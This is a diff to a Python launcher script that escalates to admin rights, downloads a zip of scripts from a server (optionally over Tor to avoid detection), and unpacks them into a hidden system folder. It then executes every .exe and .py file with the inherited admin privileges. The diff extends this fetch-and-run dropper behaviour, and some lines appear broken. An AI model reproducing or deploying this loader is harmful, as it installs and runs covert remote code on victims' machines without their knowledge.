@@ -6,11 +6,11 @@ import requests # To download scripts
 import subprocess # to launch scripts with admin privileges
 from zipfile import ZipFile # to deal with zip files
 
-zip_url = 'http://127.0.0.1:8000/scripts'
-zip_name = 'scripts.zip' # what the name of the zip containing the scripts should be called
-tor_initial = True # whether the script should make the intial request through tor or the clearweb. Recommended True so you don't leak what you're doing to the router
+ZIP_URL = 'http://127.0.0.1:8000/scripts'
+ZIP_NAME = 'scripts.zip' # what the name of the zip containing the scripts should be called
+TOR_INITIAL = True # whether the script should make the intial request through tor or the clearweb. Recommended True so you don't leak what you're doing to the router
 
-scripts_paths = {} # the paths of the scripts
+scripts_paths = [] # the paths of the scripts
 ovpn_path = ''
 
 def check_admin(os):
@@ -28,10 +28,10 @@ def get_admin(os):
     sys.exit()
 
 def get_scripts(): # downloads the scripts and puts them all in one place
-    r = requests.get(zip_url, headers={'os':sys.platform})
-    with open(zip_name, 'wb') as zip:
+    r = requests.get(ZIP_URL, headers={'os':sys.platform})
+    with open(ZIP_NAME, 'wb') as zip:
         zip.write(r.content) # make the zip file from the recieved bits in the request
-    with ZipFile(zip_name, 'r') as zip:
+    with ZipFile(ZIP_NAME, 'r') as zip:
         scripts = zip.namelist() # get the list of files in the zip
         os.makedirs(scripts_direc, exist_ok=True) # make the directory for the scripts that were downloaded
         for script in scripts:
@@ -40,14 +40,18 @@ def get_scripts(): # downloads the scripts and puts them all in one place
                 if '.ovpn' in script:
                     ovpn_path.join(f"{scripts_direc}\\{script}")
                 else:
-                    scripts_paths[script] = f'{scripts_direc}\\{script}' # add the script and its path to the dictionary of script paths
+                    scripts_paths.append(f'{scripts_direc}\\{script}') # add the script and its path to the dictionary of script paths
                 s.close()
         zip.close()
-    os.remove(zip_name)
+    os.remove(ZIP_NAME)
 
 def start_scripts():
     for script in scripts_paths:
-        subprocess.Popen([script], shell = False) # start each script as a child process of the starter script so they inherit the admin privileges
+        if '.exe' in script:
+            subprocess.Popen([script], shell = False) # start each script as a child process of the starter script so they inherit the admin privileges
+        elif '.py' in script:
+            print(script)
+            subprocess.Popen(['python', script]) # start each script as a child process of the starter script so they inherit the admin privileges
 
 if 'win' in sys.platform:
     scripts_direc = ('C:\\Common Files')  # the directory where the script will hide new files
@@ -76,4 +80,5 @@ else:
     get_scripts()
     with open(started_file, 'w') as f:
         f.close()
+    print('starting scripts')
     start_scripts()
